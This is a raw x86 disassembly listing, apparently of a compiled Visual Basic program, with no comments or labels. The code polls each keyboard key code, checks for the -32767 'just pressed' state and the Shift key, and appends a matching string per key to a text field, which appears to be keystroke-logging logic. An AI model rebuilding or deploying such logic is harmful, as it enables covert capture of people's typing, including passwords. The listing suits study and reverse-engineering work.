  4046e7:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  4046ed:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  4046f0:	ba 5a 00 00 00       	mov    $0x5a,%edx
  4046f5:	3b ca                	cmp    %edx,%ecx
  4046f7:	0f 8f 40 02 00 00    	jg     0x40493d
  4046fd:	51                   	push   %ecx
  4046fe:	e8 6d e2 ff ff       	call   0x402970
  404703:	8b f8                	mov    %eax,%edi
  404705:	ff 15 34 10 40 00    	call   *0x401034
  40470b:	6a 10                	push   $0x10
  40470d:	0f bf ff             	movswl %di,%edi
  404710:	e8 5b e2 ff ff       	call   0x402970
  404715:	89 85 4c ff ff ff    	mov    %eax,-0xb4(%ebp)
  40471b:	ff 15 34 10 40 00    	call   *0x401034
  404721:	81 ff 01 80 ff ff    	cmp    $0xffff8001,%edi
  404727:	0f 85 f4 01 00 00    	jne    0x404921
  40472d:	66 81 bd 4c ff ff ff 	cmpw   $0x8000,-0xb4(%ebp)
  404734:	00 80 
  404736:	0f 85 f0 00 00 00    	jne    0x40482c
  40473c:	8b 16                	mov    (%esi),%edx
  40473e:	56                   	push   %esi
  40473f:	ff 92 08 03 00 00    	call   *0x308(%edx)
  404745:	50                   	push   %eax
  404746:	8d 45 d0             	lea    -0x30(%ebp),%eax
  404749:	50                   	push   %eax
  40474a:	ff d3                	call   *%ebx
  40474c:	8b 0e                	mov    (%esi),%ecx
  40474e:	56                   	push   %esi
  40474f:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  404755:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  40475b:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  40475e:	50                   	push   %eax
  40475f:	52                   	push   %edx
  404760:	ff d3                	call   *%ebx
  404762:	8b f8                	mov    %eax,%edi
  404764:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  404767:	51                   	push   %ecx
  404768:	57                   	push   %edi
  404769:	8b 07                	mov    (%edi),%eax
  40476b:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  404771:	85 c0                	test   %eax,%eax
  404773:	db e2                	fnclex
  404775:	7d 12                	jge    0x404789
  404777:	68 a0 00 00 00       	push   $0xa0
  40477c:	68 84 2a 40 00       	push   $0x402a84
  404781:	57                   	push   %edi
  404782:	50                   	push   %eax
  404783:	ff 15 38 10 40 00    	call   *0x401038
  404789:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40478c:	8b 55 e8             	mov    -0x18(%ebp),%edx
  40478f:	89 45 b8             	mov    %eax,-0x48(%ebp)
  404792:	8d 45 c0             	lea    -0x40(%ebp),%eax
  404795:	52                   	push   %edx
  404796:	50                   	push   %eax
  404797:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  40479e:	c7 45 b0 08 00 00 00 	movl   $0x8,-0x50(%ebp)
  4047a5:	ff 15 a0 10 40 00    	call   *0x4010a0
  4047ab:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  4047b1:	8d 55 b0             	lea    -0x50(%ebp),%edx
  4047b4:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4047b7:	52                   	push   %edx
  4047b8:	8b 39                	mov    (%ecx),%edi
  4047ba:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  4047bd:	50                   	push   %eax
  4047be:	51                   	push   %ecx
  4047bf:	ff 15 b0 10 40 00    	call   *0x4010b0
  4047c5:	8d 55 d8             	lea    -0x28(%ebp),%edx
  4047c8:	50                   	push   %eax
  4047c9:	52                   	push   %edx
  4047ca:	ff 15 a8 10 40 00    	call   *0x4010a8
  4047d0:	89 bd c0 fe ff ff    	mov    %edi,-0x140(%ebp)
  4047d6:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  4047dc:	50                   	push   %eax
  4047dd:	8b 85 c0 fe ff ff    	mov    -0x140(%ebp),%eax
  4047e3:	57                   	push   %edi
  4047e4:	ff 90 a4 00 00 00    	call   *0xa4(%eax)
  4047ea:	85 c0                	test   %eax,%eax
  4047ec:	db e2                	fnclex
  4047ee:	7d 12                	jge    0x404802
  4047f0:	68 a4 00 00 00       	push   $0xa4
  4047f5:	68 84 2a 40 00       	push   $0x402a84
  4047fa:	57                   	push   %edi
  4047fb:	50                   	push   %eax
  4047fc:	ff 15 38 10 40 00    	call   *0x401038
  404802:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  404805:	ff 15 08 11 40 00    	call   *0x401108
  40480b:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40480e:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  404811:	51                   	push   %ecx
  404812:	52                   	push   %edx
  404813:	6a 02                	push   $0x2
  404815:	ff 15 24 10 40 00    	call   *0x401024
  40481b:	8d 45 a0             	lea    -0x60(%ebp),%eax
  40481e:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  404821:	50                   	push   %eax
  404822:	8d 55 b0             	lea    -0x50(%ebp),%edx
  404825:	51                   	push   %ecx
  404826:	52                   	push   %edx
  404827:	e9 ea 00 00 00       	jmp    0x404916
  40482c:	8b 06                	mov    (%esi),%eax
  40482e:	56                   	push   %esi
  40482f:	ff 90 08 03 00 00    	call   *0x308(%eax)
  404835:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  404838:	50                   	push   %eax
  404839:	51                   	push   %ecx
  40483a:	ff d3                	call   *%ebx
  40483c:	8b 16                	mov    (%esi),%edx
  40483e:	56                   	push   %esi
  40483f:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  404845:	ff 92 08 03 00 00    	call   *0x308(%edx)
  40484b:	50                   	push   %eax
  40484c:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  40484f:	50                   	push   %eax
  404850:	ff d3                	call   *%ebx
  404852:	8b f8                	mov    %eax,%edi
  404854:	8d 55 dc             	lea    -0x24(%ebp),%edx
  404857:	52                   	push   %edx
  404858:	57                   	push   %edi
  404859:	8b 0f                	mov    (%edi),%ecx
  40485b:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  404861:	85 c0                	test   %eax,%eax
  404863:	db e2                	fnclex
  404865:	7d 12                	jge    0x404879
  404867:	68 a0 00 00 00       	push   $0xa0
  40486c:	68 84 2a 40 00       	push   $0x402a84
  404871:	57                   	push   %edi
  404872:	50                   	push   %eax
  404873:	ff 15 38 10 40 00    	call   *0x401038
  404879:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40487c:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  40487f:	89 45 b8             	mov    %eax,-0x48(%ebp)
  404882:	8b 45 e8             	mov    -0x18(%ebp),%eax
  404885:	83 c0 20             	add    $0x20,%eax
  404888:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  40488f:	0f 80 d2 2e 00 00    	jo     0x407767
  404895:	50                   	push   %eax
  404896:	51                   	push   %ecx
  404897:	c7 45 b0 08 00 00 00 	movl   $0x8,-0x50(%ebp)
  40489e:	ff 15 a0 10 40 00    	call   *0x4010a0
  4048a4:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  4048aa:	8d 45 b0             	lea    -0x50(%ebp),%eax
  4048ad:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  4048b0:	50                   	push   %eax
  4048b1:	8b 3a                	mov    (%edx),%edi
  4048b3:	8d 55 a0             	lea    -0x60(%ebp),%edx
  4048b6:	51                   	push   %ecx
  4048b7:	52                   	push   %edx
  4048b8:	ff 15 b0 10 40 00    	call   *0x4010b0
  4048be:	50                   	push   %eax
  4048bf:	8d 45 d8             	lea    -0x28(%ebp),%eax
  4048c2:	50                   	push   %eax
  4048c3:	ff 15 a8 10 40 00    	call   *0x4010a8
  4048c9:	8b cf                	mov    %edi,%ecx
  4048cb:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  4048d1:	50                   	push   %eax
  4048d2:	57                   	push   %edi
  4048d3:	ff 91 a4 00 00 00    	call   *0xa4(%ecx)
  4048d9:	85 c0                	test   %eax,%eax
  4048db:	db e2                	fnclex
  4048dd:	7d 12                	jge    0x4048f1
  4048df:	68 a4 00 00 00       	push   $0xa4
  4048e4:	68 84 2a 40 00       	push   $0x402a84
  4048e9:	57                   	push   %edi
  4048ea:	50                   	push   %eax
  4048eb:	ff 15 38 10 40 00    	call   *0x401038
  4048f1:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4048f4:	ff 15 08 11 40 00    	call   *0x401108
  4048fa:	8d 55 d0             	lea    -0x30(%ebp),%edx
  4048fd:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  404900:	52                   	push   %edx
  404901:	50                   	push   %eax
  404902:	6a 02                	push   $0x2
  404904:	ff 15 24 10 40 00    	call   *0x401024
  40490a:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  40490d:	8d 55 c0             	lea    -0x40(%ebp),%edx
  404910:	51                   	push   %ecx
  404911:	8d 45 b0             	lea    -0x50(%ebp),%eax
  404914:	52                   	push   %edx
  404915:	50                   	push   %eax
  404916:	6a 03                	push   $0x3
  404918:	ff 15 1c 10 40 00    	call   *0x40101c
  40491e:	83 c4 1c             	add    $0x1c,%esp
  404921:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  404924:	b8 01 00 00 00       	mov    $0x1,%eax
  404929:	03 c1                	add    %ecx,%eax
  40492b:	0f 80 36 2e 00 00    	jo     0x407767
  404931:	89 45 e8             	mov    %eax,-0x18(%ebp)
  404934:	8b c8                	mov    %eax,%ecx
  404936:	33 c0                	xor    %eax,%eax
  404938:	e9 b3 fd ff ff       	jmp    0x4046f0
  40493d:	b9 08 00 00 00       	mov    $0x8,%ecx
  404942:	c7 85 30 ff ff ff 01 	movl   $0x1,-0xd0(%ebp)
  404949:	00 00 00 
  40494c:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  40494f:	ba de 00 00 00       	mov    $0xde,%edx
  404954:	3b ca                	cmp    %edx,%ecx
  404956:	0f 8f a9 2b 00 00    	jg     0x407505
  40495c:	83 f9 41             	cmp    $0x41,%ecx
  40495f:	75 07                	jne    0x404968
  404961:	c7 45 e8 5b 00 00 00 	movl   $0x5b,-0x18(%ebp)
  404968:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  40496b:	51                   	push   %ecx
  40496c:	e8 ff df ff ff       	call   0x402970
  404971:	8b f8                	mov    %eax,%edi
  404973:	ff 15 34 10 40 00    	call   *0x401034
  404979:	0f bf d7             	movswl %di,%edx
  40497c:	6a 10                	push   $0x10
  40497e:	89 55 e0             	mov    %edx,-0x20(%ebp)
  404981:	e8 ea df ff ff       	call   0x402970
  404986:	8b f8                	mov    %eax,%edi
  404988:	ff 15 34 10 40 00    	call   *0x401034
  40498e:	81 7d e0 01 80 ff ff 	cmpl   $0xffff8001,-0x20(%ebp)
  404995:	0f bf ff             	movswl %di,%edi
  404998:	0f 85 4a 2b 00 00    	jne    0x4074e8
  40499e:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4049a1:	83 c0 f8             	add    $0xfffffff8,%eax
  4049a4:	3d d6 00 00 00       	cmp    $0xd6,%eax
  4049a9:	0f 87 39 2b 00 00    	ja     0x4074e8
  4049af:	33 c9                	xor    %ecx,%ecx
  4049b1:	8a 88 90 76 40 00    	mov    0x407690(%eax),%cl
  4049b7:	ff 24 8d 70 75 40 00 	jmp    *0x407570(,%ecx,4)
  4049be:	8b 16                	mov    (%esi),%edx
  4049c0:	56                   	push   %esi
  4049c1:	ff 92 08 03 00 00    	call   *0x308(%edx)
  4049c7:	50                   	push   %eax
  4049c8:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4049cb:	50                   	push   %eax
  4049cc:	ff d3                	call   *%ebx
  4049ce:	8b 0e                	mov    (%esi),%ecx
  4049d0:	56                   	push   %esi
  4049d1:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  4049d7:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  4049dd:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  4049e0:	50                   	push   %eax
  4049e1:	52                   	push   %edx
  4049e2:	ff d3                	call   *%ebx
  4049e4:	8b f8                	mov    %eax,%edi
  4049e6:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4049e9:	51                   	push   %ecx
  4049ea:	57                   	push   %edi
  4049eb:	8b 07                	mov    (%edi),%eax
  4049ed:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  4049f3:	85 c0                	test   %eax,%eax
  4049f5:	db e2                	fnclex
  4049f7:	7d 12                	jge    0x404a0b
  4049f9:	68 a0 00 00 00       	push   $0xa0
  4049fe:	68 84 2a 40 00       	push   $0x402a84
  404a03:	57                   	push   %edi
  404a04:	50                   	push   %eax
  404a05:	ff 15 38 10 40 00    	call   *0x401038
  404a0b:	8b 45 dc             	mov    -0x24(%ebp),%eax
  404a0e:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  404a14:	50                   	push   %eax
  404a15:	68 1c 2b 40 00       	push   $0x402b1c
  404a1a:	8b 3a                	mov    (%edx),%edi
  404a1c:	ff 15 30 10 40 00    	call   *0x401030
  404a22:	8b d0                	mov    %eax,%edx
  404a24:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  404a27:	ff 15 f0 10 40 00    	call   *0x4010f0
  404a2d:	8b cf                	mov    %edi,%ecx
  404a2f:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  404a35:	50                   	push   %eax
  404a36:	57                   	push   %edi
  404a37:	ff 91 a4 00 00 00    	call   *0xa4(%ecx)
  404a3d:	85 c0                	test   %eax,%eax
  404a3f:	db e2                	fnclex
  404a41:	7d 12                	jge    0x404a55
  404a43:	68 a4 00 00 00       	push   $0xa4
  404a48:	68 84 2a 40 00       	push   $0x402a84
  404a4d:	57                   	push   %edi
  404a4e:	50                   	push   %eax
  404a4f:	ff 15 38 10 40 00    	call   *0x401038
  404a55:	8d 55 d8             	lea    -0x28(%ebp),%edx
  404a58:	8d 45 dc             	lea    -0x24(%ebp),%eax
  404a5b:	52                   	push   %edx
  404a5c:	50                   	push   %eax
  404a5d:	6a 02                	push   $0x2
  404a5f:	ff 15 d0 10 40 00    	call   *0x4010d0
  404a65:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  404a68:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  404a6b:	51                   	push   %ecx
  404a6c:	52                   	push   %edx
  404a6d:	6a 02                	push   $0x2
  404a6f:	ff 15 24 10 40 00    	call   *0x401024
  404a75:	8b 06                	mov    (%esi),%eax
  404a77:	83 c4 18             	add    $0x18,%esp
  404a7a:	56                   	push   %esi
  404a7b:	ff 90 08 03 00 00    	call   *0x308(%eax)
  404a81:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  404a84:	50                   	push   %eax
  404a85:	51                   	push   %ecx
  404a86:	ff d3                	call   *%ebx
  404a88:	8b 16                	mov    (%esi),%edx
  404a8a:	56                   	push   %esi
  404a8b:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  404a91:	ff 92 08 03 00 00    	call   *0x308(%edx)
  404a97:	50                   	push   %eax
  404a98:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  404a9b:	50                   	push   %eax
  404a9c:	ff d3                	call   *%ebx
  404a9e:	8b f8                	mov    %eax,%edi
  404aa0:	8d 55 dc             	lea    -0x24(%ebp),%edx
  404aa3:	52                   	push   %edx
  404aa4:	57                   	push   %edi
  404aa5:	8b 0f                	mov    (%edi),%ecx
  404aa7:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  404aad:	85 c0                	test   %eax,%eax
  404aaf:	db e2                	fnclex
  404ab1:	7d 12                	jge    0x404ac5
  404ab3:	68 a0 00 00 00       	push   $0xa0
  404ab8:	68 84 2a 40 00       	push   $0x402a84
  404abd:	57                   	push   %edi
  404abe:	50                   	push   %eax
  404abf:	ff 15 38 10 40 00    	call   *0x401038
  404ac5:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  404ac8:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  404ace:	51                   	push   %ecx
  404acf:	68 34 2b 40 00       	push   $0x402b34
  404ad4:	8b 38                	mov    (%eax),%edi
  404ad6:	ff 15 30 10 40 00    	call   *0x401030
  404adc:	8b d0                	mov    %eax,%edx
  404ade:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  404ae1:	ff 15 f0 10 40 00    	call   *0x4010f0
  404ae7:	8b d7                	mov    %edi,%edx
  404ae9:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  404aef:	50                   	push   %eax
  404af0:	57                   	push   %edi
  404af1:	ff 92 a4 00 00 00    	call   *0xa4(%edx)
  404af7:	85 c0                	test   %eax,%eax
  404af9:	db e2                	fnclex
  404afb:	0f 8d 52 28 00 00    	jge    0x407353
  404b01:	e9 3b 28 00 00       	jmp    0x407341
  404b06:	8b 0e                	mov    (%esi),%ecx
  404b08:	56                   	push   %esi
  404b09:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  404b0f:	8d 55 d0             	lea    -0x30(%ebp),%edx
  404b12:	50                   	push   %eax
  404b13:	52                   	push   %edx
  404b14:	ff d3                	call   *%ebx
  404b16:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  404b1c:	8b 06                	mov    (%esi),%eax
  404b1e:	56                   	push   %esi
  404b1f:	ff 90 08 03 00 00    	call   *0x308(%eax)
  404b25:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  404b28:	50                   	push   %eax
  404b29:	51                   	push   %ecx
  404b2a:	ff d3                	call   *%ebx
  404b2c:	8b f8                	mov    %eax,%edi
  404b2e:	8d 45 dc             	lea    -0x24(%ebp),%eax
  404b31:	50                   	push   %eax
  404b32:	57                   	push   %edi
  404b33:	8b 17                	mov    (%edi),%edx
  404b35:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  404b3b:	85 c0                	test   %eax,%eax
  404b3d:	db e2                	fnclex
  404b3f:	7d 12                	jge    0x404b53
  404b41:	68 a0 00 00 00       	push   $0xa0
  404b46:	68 84 2a 40 00       	push   $0x402a84
  404b4b:	57                   	push   %edi
  404b4c:	50                   	push   %eax
  404b4d:	ff 15 38 10 40 00    	call   *0x401038
  404b53:	8b 55 dc             	mov    -0x24(%ebp),%edx
  404b56:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  404b5c:	52                   	push   %edx
  404b5d:	68 9c 24 40 00       	push   $0x40249c
  404b62:	8b 39                	mov    (%ecx),%edi
  404b64:	ff 15 30 10 40 00    	call   *0x401030
  404b6a:	8b d0                	mov    %eax,%edx
  404b6c:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  404b6f:	ff 15 f0 10 40 00    	call   *0x4010f0
  404b75:	89 bd b0 fe ff ff    	mov    %edi,-0x150(%ebp)
  404b7b:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  404b81:	50                   	push   %eax
  404b82:	8b 85 b0 fe ff ff    	mov    -0x150(%ebp),%eax
  404b88:	57                   	push   %edi
  404b89:	ff 90 a4 00 00 00    	call   *0xa4(%eax)
  404b8f:	85 c0                	test   %eax,%eax
  404b91:	db e2                	fnclex
  404b93:	0f 8d 78 28 00 00    	jge    0x407411
  404b99:	e9 61 28 00 00       	jmp    0x4073ff
  404b9e:	8b 16                	mov    (%esi),%edx
  404ba0:	56                   	push   %esi
  404ba1:	ff 92 08 03 00 00    	call   *0x308(%edx)
  404ba7:	50                   	push   %eax
  404ba8:	8d 45 d0             	lea    -0x30(%ebp),%eax
  404bab:	50                   	push   %eax
  404bac:	ff d3                	call   *%ebx
  404bae:	8b 0e                	mov    (%esi),%ecx
  404bb0:	56                   	push   %esi
  404bb1:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  404bb7:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  404bbd:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  404bc0:	50                   	push   %eax
  404bc1:	52                   	push   %edx
  404bc2:	ff d3                	call   *%ebx
  404bc4:	8b f8                	mov    %eax,%edi
  404bc6:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  404bc9:	51                   	push   %ecx
  404bca:	57                   	push   %edi
  404bcb:	8b 07                	mov    (%edi),%eax
  404bcd:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  404bd3:	85 c0                	test   %eax,%eax
  404bd5:	db e2                	fnclex
  404bd7:	7d 12                	jge    0x404beb
  404bd9:	68 a0 00 00 00       	push   $0xa0
  404bde:	68 84 2a 40 00       	push   $0x402a84
  404be3:	57                   	push   %edi
  404be4:	50                   	push   %eax
  404be5:	ff 15 38 10 40 00    	call   *0x401038
  404beb:	8b 45 dc             	mov    -0x24(%ebp),%eax
  404bee:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  404bf4:	50                   	push   %eax
  404bf5:	68 40 2b 40 00       	push   $0x402b40
  404bfa:	8b 3a                	mov    (%edx),%edi
  404bfc:	ff 15 30 10 40 00    	call   *0x401030
  404c02:	8b d0                	mov    %eax,%edx
  404c04:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  404c07:	ff 15 f0 10 40 00    	call   *0x4010f0
  404c0d:	8b cf                	mov    %edi,%ecx
  404c0f:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  404c15:	50                   	push   %eax
  404c16:	57                   	push   %edi
  404c17:	e9 8b 26 00 00       	jmp    0x4072a7
  404c1c:	8b 06                	mov    (%esi),%eax
  404c1e:	56                   	push   %esi
  404c1f:	ff 90 08 03 00 00    	call   *0x308(%eax)
  404c25:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  404c28:	50                   	push   %eax
  404c29:	51                   	push   %ecx
  404c2a:	ff d3                	call   *%ebx
  404c2c:	8b 16                	mov    (%esi),%edx
  404c2e:	56                   	push   %esi
  404c2f:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  404c35:	ff 92 08 03 00 00    	call   *0x308(%edx)
  404c3b:	50                   	push   %eax
  404c3c:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  404c3f:	50                   	push   %eax
  404c40:	ff d3                	call   *%ebx
  404c42:	8b f8                	mov    %eax,%edi
  404c44:	8d 55 dc             	lea    -0x24(%ebp),%edx
  404c47:	52                   	push   %edx
  404c48:	57                   	push   %edi
  404c49:	8b 0f                	mov    (%edi),%ecx
  404c4b:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  404c51:	85 c0                	test   %eax,%eax
  404c53:	db e2                	fnclex
  404c55:	7d 12                	jge    0x404c69
  404c57:	68 a0 00 00 00       	push   $0xa0
  404c5c:	68 84 2a 40 00       	push   $0x402a84
  404c61:	57                   	push   %edi
  404c62:	50                   	push   %eax
  404c63:	ff 15 38 10 40 00    	call   *0x401038
  404c69:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  404c6c:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  404c72:	51                   	push   %ecx
  404c73:	68 48 2b 40 00       	push   $0x402b48
  404c78:	8b 38                	mov    (%eax),%edi
  404c7a:	ff 15 30 10 40 00    	call   *0x401030
  404c80:	8b d0                	mov    %eax,%edx
  404c82:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  404c85:	ff 15 f0 10 40 00    	call   *0x4010f0
  404c8b:	8b d7                	mov    %edi,%edx
  404c8d:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  404c93:	50                   	push   %eax
  404c94:	57                   	push   %edi
  404c95:	e9 57 fe ff ff       	jmp    0x404af1
  404c9a:	8b 0e                	mov    (%esi),%ecx
  404c9c:	56                   	push   %esi
  404c9d:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  404ca3:	8d 55 d0             	lea    -0x30(%ebp),%edx
  404ca6:	50                   	push   %eax
  404ca7:	52                   	push   %edx
  404ca8:	ff d3                	call   *%ebx
  404caa:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  404cb0:	8b 06                	mov    (%esi),%eax
  404cb2:	56                   	push   %esi
  404cb3:	ff 90 08 03 00 00    	call   *0x308(%eax)
  404cb9:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  404cbc:	50                   	push   %eax
  404cbd:	51                   	push   %ecx
  404cbe:	ff d3                	call   *%ebx
  404cc0:	8b f8                	mov    %eax,%edi
  404cc2:	8d 45 dc             	lea    -0x24(%ebp),%eax
  404cc5:	50                   	push   %eax
  404cc6:	57                   	push   %edi
  404cc7:	8b 17                	mov    (%edi),%edx
  404cc9:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  404ccf:	85 c0                	test   %eax,%eax
  404cd1:	db e2                	fnclex
  404cd3:	7d 12                	jge    0x404ce7
  404cd5:	68 a0 00 00 00       	push   $0xa0
  404cda:	68 84 2a 40 00       	push   $0x402a84
  404cdf:	57                   	push   %edi
  404ce0:	50                   	push   %eax
  404ce1:	ff 15 38 10 40 00    	call   *0x401038
  404ce7:	8b 55 dc             	mov    -0x24(%ebp),%edx
  404cea:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  404cf0:	52                   	push   %edx
  404cf1:	68 50 2b 40 00       	push   $0x402b50
  404cf6:	8b 39                	mov    (%ecx),%edi
  404cf8:	ff 15 30 10 40 00    	call   *0x401030
  404cfe:	8b d0                	mov    %eax,%edx
  404d00:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  404d03:	ff 15 f0 10 40 00    	call   *0x4010f0
  404d09:	89 bd a4 fe ff ff    	mov    %edi,-0x15c(%ebp)
  404d0f:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  404d15:	50                   	push   %eax
  404d16:	8b 85 a4 fe ff ff    	mov    -0x15c(%ebp),%eax
  404d1c:	57                   	push   %edi
  404d1d:	e9 67 fe ff ff       	jmp    0x404b89
  404d22:	8b 16                	mov    (%esi),%edx
  404d24:	56                   	push   %esi
  404d25:	ff 92 08 03 00 00    	call   *0x308(%edx)
  404d2b:	50                   	push   %eax
  404d2c:	8d 45 d0             	lea    -0x30(%ebp),%eax
  404d2f:	50                   	push   %eax
  404d30:	ff d3                	call   *%ebx
  404d32:	8b 0e                	mov    (%esi),%ecx
  404d34:	56                   	push   %esi
  404d35:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  404d3b:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  404d41:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  404d44:	50                   	push   %eax
  404d45:	52                   	push   %edx
  404d46:	ff d3                	call   *%ebx
  404d48:	8b f8                	mov    %eax,%edi
  404d4a:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  404d4d:	51                   	push   %ecx
  404d4e:	57                   	push   %edi
  404d4f:	8b 07                	mov    (%edi),%eax
  404d51:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  404d57:	85 c0                	test   %eax,%eax
  404d59:	db e2                	fnclex
  404d5b:	7d 12                	jge    0x404d6f
  404d5d:	68 a0 00 00 00       	push   $0xa0
  404d62:	68 84 2a 40 00       	push   $0x402a84
  404d67:	57                   	push   %edi
  404d68:	50                   	push   %eax
  404d69:	ff 15 38 10 40 00    	call   *0x401038
  404d6f:	8b 45 dc             	mov    -0x24(%ebp),%eax
  404d72:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  404d78:	50                   	push   %eax
  404d79:	68 58 2b 40 00       	push   $0x402b58
  404d7e:	8b 3a                	mov    (%edx),%edi
  404d80:	ff 15 30 10 40 00    	call   *0x401030
  404d86:	8b d0                	mov    %eax,%edx
  404d88:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  404d8b:	ff 15 f0 10 40 00    	call   *0x4010f0
  404d91:	8b cf                	mov    %edi,%ecx
  404d93:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  404d99:	50                   	push   %eax
  404d9a:	57                   	push   %edi
  404d9b:	e9 07 25 00 00       	jmp    0x4072a7
  404da0:	8b 06                	mov    (%esi),%eax
  404da2:	56                   	push   %esi
  404da3:	ff 90 08 03 00 00    	call   *0x308(%eax)
  404da9:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  404dac:	50                   	push   %eax
  404dad:	51                   	push   %ecx
  404dae:	ff d3                	call   *%ebx
  404db0:	8b 16                	mov    (%esi),%edx
  404db2:	56                   	push   %esi
  404db3:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  404db9:	ff 92 08 03 00 00    	call   *0x308(%edx)
  404dbf:	50                   	push   %eax
  404dc0:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  404dc3:	50                   	push   %eax
  404dc4:	ff d3                	call   *%ebx
  404dc6:	8b f8                	mov    %eax,%edi
  404dc8:	8d 55 dc             	lea    -0x24(%ebp),%edx
  404dcb:	52                   	push   %edx
  404dcc:	57                   	push   %edi
  404dcd:	8b 0f                	mov    (%edi),%ecx
  404dcf:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  404dd5:	85 c0                	test   %eax,%eax
  404dd7:	db e2                	fnclex
  404dd9:	7d 12                	jge    0x404ded
  404ddb:	68 a0 00 00 00       	push   $0xa0
  404de0:	68 84 2a 40 00       	push   $0x402a84
  404de5:	57                   	push   %edi
  404de6:	50                   	push   %eax
  404de7:	ff 15 38 10 40 00    	call   *0x401038
  404ded:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  404df0:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  404df6:	51                   	push   %ecx
  404df7:	68 60 2b 40 00       	push   $0x402b60
  404dfc:	8b 38                	mov    (%eax),%edi
  404dfe:	ff 15 30 10 40 00    	call   *0x401030
  404e04:	8b d0                	mov    %eax,%edx
